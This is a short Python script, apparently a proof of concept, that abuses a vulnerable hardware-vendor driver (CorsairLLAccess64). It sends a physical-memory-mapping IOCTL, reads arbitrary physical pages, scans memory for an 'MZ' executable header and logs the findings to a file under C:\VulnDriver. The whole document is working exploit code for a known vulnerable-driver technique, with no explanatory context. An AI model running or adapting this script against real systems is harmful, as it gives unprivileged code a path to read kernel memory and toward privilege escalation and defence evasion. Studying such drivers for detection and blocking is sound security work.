
import ctypes
import struct

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_and_read(h, pa):
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    try:
        return bytes((ctypes.c_ubyte * 16).from_address(out.value))
    except:
        return None

def main():
    with open(r"C:\VulnDriver\diag_out.txt", "w") as f:
        f.write("Diag start\n")
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        with open(r"C:\VulnDriver\diag_out.txt", "a") as f:
            f.write(f"Driver Error {ctypes.get_last_error()}\n")
        return

    # ... rest of code ...
    data = map_and_read(h, 0x1AE000)
    with open(r"C:\VulnDriver\diag_out.txt", "a") as f:
        if data:
            f.write(f"Read 0x1AE000: {data.hex()}\n")
        else:
            f.write("Failed 0x1AE000\n")
            
    for pa in range(0, 0x8000000, 0x200000):
        data = map_and_read(h, pa)
        if data and data[:2] == b"MZ":
             with open(r"C:\VulnDriver\diag_out.txt", "a") as f:
                f.write(f"FOUND MZ at 0x{pa:X}\n")
             return
    with open(r"C:\VulnDriver\diag_out.txt", "a") as f:
        f.write("Done\n")

if __name__ == "__main__":
    main()
